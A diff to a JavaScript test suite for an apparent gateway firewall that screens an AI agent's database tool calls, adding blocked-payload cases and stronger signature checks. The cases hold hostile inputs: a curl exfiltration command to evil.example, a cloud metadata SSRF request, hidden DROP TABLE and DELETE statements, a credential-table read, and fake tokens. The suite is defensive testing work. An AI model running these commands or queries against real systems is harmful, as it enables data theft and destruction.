@@ -300,6 +300,48 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
       category: 'PostgreSQL pg_authid / pg_roles System Table Block',
       payload: 'SELECT * FROM pg_authid',
       expectedRule: 'SENSITIVE_CREDENTIAL_TABLE_BLOCKED'
+    },
+    {
+      id: 49,
+      category: 'GitHub Fine-Grained PAT Token in SQL Query DLP Block',
+      payload: "SELECT id, name FROM users WHERE token = 'github_pat_11ABCDEFG1234567890abcdefg'",
+      expectedRule: 'DLP_API_SECRET_DETECTED'
+    },
+    {
+      id: 50,
+      category: 'JSON Unicode Escaped Token in SQL Query DLP Block',
+      payload: "SELECT * FROM users WHERE token = '\\u0067\\u0069\\u0074\\u0068\\u0075\\u0062\\u005f\\u0070\\u0061\\u0074\\u005f11ABCDEFG1234567890abcdefg'",
+      expectedRule: 'DLP_API_SECRET_DETECTED'
+    },
+    {
+      id: 51,
+      category: 'RSA Private Key Literal inside SQL Query DLP Block',
+      payload: "SELECT * FROM keys WHERE rsa = '-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA0...'",
+      expectedRule: 'DLP_PRIVATE_KEY_DETECTED'
+    },
+    {
+      id: 52,
+      category: 'Shell Network Egress Command Block (curl evil.example)',
+      payload: 'curl http://evil.example/-d @/tmp/x',
+      expectedRule: 'EGRESS_FIREWALL_VIOLATION'
+    },
+    {
+      id: 53,
+      category: 'Cloud Metadata IMDS SSRF Address Block (169.254.169.254)',
+      payload: 'GET http://169.254.169.254/latest/meta-data/',
+      expectedRule: 'SSRF_METADATA_EXFILTRATION_BLOCKED'
+    },
+    {
+      id: 54,
+      category: 'MySQL Executable Comment DDL Injection Block (/*!50000 DROP TABLE*/)',
+      payload: '/*!50000 DROP TABLE users */',
+      expectedRule: 'DESTRUCTIVE_SQL_DDL'
+    },
+    {
+      id: 55,
+      category: 'CTE with Destructive DML (WITH d AS (DELETE FROM...))',
+      payload: 'WITH d AS (DELETE FROM users WHERE id=1 RETURNING *) SELECT * FROM d;',
+      expectedRule: 'UNAUTHORIZED_PRIVILEGED_DML'
     }
   ];
 
@@ -313,7 +355,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     });
   }
 
-  await t.test('Vector #49 [In-Place Unicode & Zero-Width Sanitization]: Injected U+200B and U+202E characters MUST be stripped from returned payload', () => {
+  await t.test('Vector #56 [In-Place Unicode & Zero-Width Sanitization]: Injected U+200B and U+202E characters MUST be stripped from returned payload', () => {
     const dirtyPayload = { query: 'SELECT id,\u200B name\u202E FROM users WHERE active = true' };
     const res = waf.inspectToolCall('postgres_query', dirtyPayload);
 
@@ -323,7 +365,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     assert.ok(!res.sanitizedPayload.query.includes('\u202E'), 'Failed to strip U+202E RTL override character!');
   });
 
-  await t.test('Vector #50 [Legitimate Safe Query]: Should permit and cryptographically sign valid read queries', () => {
+  await t.test('Vector #57 [Legitimate Safe Query]: Should permit, attach nonce/timestamp, and cryptographically sign valid read queries', () => {
     const safePayload = { query: 'SELECT id, name, created_at FROM organizations WHERE plan = "enterprise" LIMIT 20;' };
     const res = waf.inspectToolCall('postgres_query', safePayload);
 
@@ -331,26 +373,21 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     assert.strictEqual(res.algorithm, 'Ed25519');
     assert.ok(res.signature);
     assert.ok(res.traceId);
+    assert.ok(res.nonce);
+    assert.ok(res.timestamp);
+    assert.ok(res.policyVersion);
     assert.ok(res.publicKey);
   });
 
-  await t.test('Vector #51 [Ed25519 Canonical Specification & Mathematical Verification]: Anyone can independently verify the signature against the published canonical format', () => {
+  await t.test('Vector #58 [Ed25519 Attestation Nonce/Context Binding & Mathematical Verification]: Anyone can independently verify signature against canonical spec', () => {
+    const { verifyAttestation } = require('./packages/gateway-core/src/security/waf');
     const payload = { query: 'SELECT * FROM users WHERE active = true' };
     const res = waf.inspectToolCall('postgres_query', payload);
 
     assert.strictEqual(res.isSafe, true);
     
-    // Published canonical spec: `${toolName}:${JSON.stringify(sanitizedPayload)}`
-    const canonicalMessage = `postgres_query:${JSON.stringify(res.sanitizedPayload)}`;
-    const hash = crypto.createHash('sha256').update(canonicalMessage).digest();
-    
-    const isVerified = crypto.verify(
-      null, 
-      hash, 
-      PUBLIC_KEY, 
-      Buffer.from(res.signature, 'hex')
-    );
-    
+    // Independent verification using canonical format
+    const isVerified = verifyAttestation(res);
     assert.strictEqual(isVerified, true, 'Cryptographic Ed25519 verification failed against canonical specification!');
   });
 });
